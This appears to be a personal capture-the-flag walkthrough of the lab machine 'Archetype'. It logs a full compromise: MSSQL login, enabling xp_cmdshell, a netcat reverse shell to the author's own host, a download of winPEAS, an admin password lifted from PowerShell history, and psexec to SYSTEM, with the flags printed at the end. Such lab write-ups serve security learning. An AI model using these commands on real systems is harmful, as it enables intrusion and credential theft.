//ok using third party tool ain't that easy

impacket mssqlclient installed 
python3 mssqlclient.py ARCHETYPE\sql_svc@10.129.95.187 -windows-auth

ok it seems there is a mistake here (typo?)
the username should be changed to this:
ARCHETYPE/sql_svc (it works only with the anti-slash)

password:
M3g4c0rp123

//Access granted
SQL> help

lcd {path}                 - changes the current local directory to {path}
exit                       - terminates the server process (and this session)
enable_xp_cmdshell         - you know what it means
disable_xp_cmdshell        - you know what it means
xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
! {cmd}                    - executes a local shell cmd


SQL> SELECT is_srvrolemember('sysadmin');


-----------   

1   (means TRUE)

//We are sysadmin baby

SQL> EXEC xp_cmdshell'net_user';
[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.


SQL> Exec sp_configure 'show advanced options',1;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.



SQL> RECONFIGURE;
SQL> sp_configure;
name                                      minimum       maximum   config_value     run_value   

-----------------------------------   -----------   -----------   ------------   -----------   

access check cache bucket count                 0         65536              0             0   

access check cache quota                        0    2147483647              0             0   

Ad Hoc Distributed Queries                      0             1              0             0   

affinity I/O mask                     -2147483648    2147483647              0             0   

affinity mask                         -2147483648    2147483647              0             0   

affinity64 I/O mask                   -2147483648    2147483647              0             0   

affinity64 mask                       -2147483648    2147483647              0             0   

Agent XPs                                       0             1              0             0   

allow polybase export                           0             1              0             0   

allow updates                                   0             1              0             0   

automatic soft-NUMA disabled                    0             1              0             0   

backup checksum default                         0             1              0             0   

backup compression default                      0             1              0             0   

blocked process threshold (s)                   0         86400              0             0   

c2 audit mode                                   0             1              0             0   

clr enabled                                     0             1              0             0   

clr strict security                             0             1              1             1   

contained database authentication               0             1              0             0   

cost threshold for parallelism                  0         32767              5             5   

cross db ownership chaining                     0             1              0             0   

cursor threshold                               -1    2147483647             -1            -1   

Database Mail XPs                               0             1              0             0   

default full-text language                      0    2147483647           1033          1033   

default language                                0          9999              0             0   

default trace enabled                           0             1              1             1   

disallow results from triggers                  0             1              0             0   

external scripts enabled                        0             1              0             0   

filestream access level                         0             2              0             0   

fill factor (%)                                 0           100              0             0   

ft crawl bandwidth (max)                        0         32767            100           100   

ft crawl bandwidth (min)                        0         32767              0             0   

ft notify bandwidth (max)                       0         32767            100           100   

ft notify bandwidth (min)                       0         32767              0             0   

hadoop connectivity                             0             7              0             0   

index create memory (KB)                      704    2147483647              0             0   

in-doubt xact resolution                        0             2              0             0   

lightweight pooling                             0             1              0             0   

locks                                        5000    2147483647              0             0   

max degree of parallelism                       0         32767              0             0   

max full-text crawl range                       0           256              4             4   

max server memory (MB)                        128    2147483647     2147483647    2147483647   

max text repl size (B)                         -1    2147483647          65536         65536   

max worker threads                            128         65535              0             0   

media retention                                 0           365              0             0   

min memory per query (KB)                     512    2147483647           1024          1024   

min server memory (MB)                          0    2147483647              0            16   

nested triggers                                 0             1              1             1   

network packet size (B)                       512         32767           4096          4096   

Ole Automation Procedures                       0             1              0             0   

open objects                                    0    2147483647              0             0   

optimize for ad hoc workloads                   0             1              0             0   

PH timeout (s)                                  1          3600             60            60   

polybase network encryption                     0             1              1             1   

precompute rank                                 0             1              0             0   

priority boost                                  0             1              0             0   

query governor cost limit                       0    2147483647              0             0   

query wait (s)                                 -1    2147483647             -1            -1   

recovery interval (min)                         0         32767              0             0   

remote access                                   0             1              1             1   

remote admin connections                        0             1              0             0   

remote data archive                             0             1              0             0   

remote login timeout (s)                        0    2147483647             10            10   

remote proc trans                               0             1              0             0   

remote query timeout (s)                        0    2147483647            600           600   

Replication XPs                                 0             1              0             0   

scan for startup procs                          0             1              0             0   

server trigger recursion                        0             1              1             1   

set working set size                            0             1              0             0   

show advanced options                           0             1              1             1   

SMO and DMO XPs                                 0             1              1             1   

transform noise words                           0             1              0             0   

two digit year cutoff                        1753          9999           2049          2049   

user connections                                0         32767              0             0   

user options                                    0         32767              0             0   

xp_cmdshell                                     0             1              0             0   



SQL> EXEC sp_configure 'xp_cmdshell',1;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;

SQL> xp_cmdshell "whoami"
output                                                                             

--------------------------------------------------------------------------------   

archetype\sql_svc                                                                  

NULL  


//now uploading nc64 (downloaded) to get a stable reverse shell
used a python server for upload and netcat to catch incoming connection on port 443

//current directory
SQL> xp_cmdshell "powershell -c pwd"
output                                                                             

--------------------------------------------------------------------------------   

NULL                                                                               

Path                                                                               

----                                                                               

C:\Windows\system32                                                                

NULL                                                                               

NULL                                                                               

NULL    

//uploading
SQL> xp_cmdshell "powershell -c cd C:\users\sql_svc\Downloads; wget http://10.10.14.230/nc64.exe -outfile nc64.exe"

//ok actiation of reverse shell
SQL> xp_cmdshell "powershell -c cd C:\users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.230 443"


//Initial access succeed
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\users\sql_svc\Downloads>cd ..
cd ..

C:\Users\sql_svc>dir
dir
Volume in drive C has no label.
Volume Serial Number is 9565-0B4F

Directory of C:\Users\sql_svc

01/20/2020  06:01 AM    <DIR>          .
01/20/2020  06:01 AM    <DIR>          ..
01/20/2020  06:01 AM    <DIR>          3D Objects
01/20/2020  06:01 AM    <DIR>          Contacts
01/20/2020  06:42 AM    <DIR>          Desktop
01/20/2020  06:01 AM    <DIR>          Documents
10/27/2021  04:39 PM    <DIR>          Downloads
01/20/2020  06:01 AM    <DIR>          Favorites
01/20/2020  06:01 AM    <DIR>          Links
01/20/2020  06:01 AM    <DIR>          Music
01/20/2020  06:01 AM    <DIR>          Pictures
01/20/2020  06:01 AM    <DIR>          Saved Games
01/20/2020  06:01 AM    <DIR>          Searches
01/20/2020  06:01 AM    <DIR>          Videos
0 File(s)              0 bytes
14 Dir(s)  10,710,228,992 bytes free

C:\Users\sql_svc>cd Desktop
C:\Users\sql_svc\Desktop>dir
dir
Volume in drive C has no label.
Volume Serial Number is 9565-0B4F

Directory of C:\Users\sql_svc\Desktop

01/20/2020  06:42 AM    <DIR>          .
01/20/2020  06:42 AM    <DIR>          ..
02/25/2020  07:37 AM                32 user.txt
1 File(s)             32 bytes
2 Dir(s)  10,710,228,992 bytes free

C:\Users\sql_svc\Desktop>file user.txt
file user.txt
'file' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\sql_svc\Desktop>type user.txt
type user.txt
3e7b102e78218e935bf3f4951fec21a3


//First FLAG FOUND
//Time to PrivEsc

C:\Users\sql_svc\Downloads>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\sql_svc\Downloads> wget http://10.10.14.230/winPEASx64.exe -outfile winPEASx64.exe
wget http://10.10.14.230/winPEASx64.exe -outfile winPEASx64.exe


PS C:\Users\sql_svc\Downloads> ./winPEASx64.exe

//put Output in a separate file due to HYPERverbosity but one nice part is

����������͹ Analyzing Windows Files Files (limit 70)
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
C:\Users\Default\NTUSER.DAT
C:\Users\sql_svc\NTUSER.DAT


PS C:\users\sql_svc\Downloads> cd ..
cd ..
PS C:\users\sql_svc> cd AppData
cd AppData
PS C:\users\sql_svc\AppData> cd Roaming\Microsoft\Windows       
cd Roaming\Microsoft\Windows
PS C:\users\sql_svc\AppData\Roaming\Microsoft\Windows> cd Powershell
cd Powershell
PS C:\users\sql_svc\AppData\Roaming\Microsoft\Windows\Powershell> cd PSReadline
cd PSReadline
PS C:\users\sql_svc\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline>
PS C:\users\sql_svc\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline> dir
dir


Directory: C:\users\sql_svc\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        3/17/2020   2:36 AM             79 ConsoleHost_history.txt                                               


//found ConsoleHost_history.txt file
PS C:\users\sql_svc\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline> type ConsoleHost_history.txt
type ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit

//found administrator creds

//Now we use psexec.py FROM impacket to get new access
$python3 psexec.py administrator@10.129.95.187

Impacket v0.9.25.dev1 - Copyright 2021 SecureAuth Corporation

Password:
[*] Requesting shares on 10.129.95.187.....
[*] Found writable share ADMIN$
[*] Uploading file JxrXPcpX.exe
[*] Opening SVCManager on 10.129.95.187.....
[*] Creating service wFLN on 10.129.95.187.....
[*] Starting service wFLN.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 

//Victory
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> cd C:\Users\Administrator

C:\Users\Administrator> dir
Volume in drive C has no label.
Volume Serial Number is 9565-0B4F

Directory of C:\Users\Administrator

01/19/2020  11:39 PM    <DIR>          .
01/19/2020  11:39 PM    <DIR>          ..
07/27/2021  02:30 AM    <DIR>          3D Objects
07/27/2021  02:30 AM    <DIR>          Contacts
07/27/2021  02:30 AM    <DIR>          Desktop
07/27/2021  02:30 AM    <DIR>          Documents
07/27/2021  02:30 AM    <DIR>          Downloads
07/27/2021  02:30 AM    <DIR>          Favorites
07/27/2021  02:30 AM    <DIR>          Links
07/27/2021  02:30 AM    <DIR>          Music
07/27/2021  02:30 AM    <DIR>          Pictures
07/27/2021  02:30 AM    <DIR>          Saved Games
07/27/2021  02:30 AM    <DIR>          Searches
07/27/2021  02:30 AM    <DIR>          Videos
0 File(s)              0 bytes
14 Dir(s)  10,704,728,064 bytes free

C:\Users\Administrator> cd Desktop

C:\Users\Administrator\Desktop> dir
Volume in drive C has no label.
Volume Serial Number is 9565-0B4F

Directory of C:\Users\Administrator\Desktop

07/27/2021  02:30 AM    <DIR>          .
07/27/2021  02:30 AM    <DIR>          ..
02/25/2020  07:36 AM                32 root.txt
1 File(s)             32 bytes
2 Dir(s)  10,704,728,064 bytes free

//root flag
C:\Users\Administrator\Desktop> type root.txt
b91ccec3305e98240082d4474b848528
C:\Users\Administrator\Desktop> 





IN CONCLUSION:
user flag: 3e7b102e78218e935bf3f4951fec21a3
root flag: b91ccec3305e98240082d4474b848528





























